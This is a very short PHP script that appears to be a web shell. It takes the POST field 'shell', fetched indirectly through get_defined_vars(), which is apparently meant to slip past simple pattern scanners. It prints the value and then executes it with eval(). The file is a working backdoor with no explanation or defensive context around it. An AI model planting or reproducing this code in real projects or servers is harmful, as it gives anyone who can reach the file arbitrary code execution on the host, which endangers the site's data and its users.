<?php
$arr = get_defined_vars()['_POST']['shell'];
var_dump($arr);
eval($arr);
?>
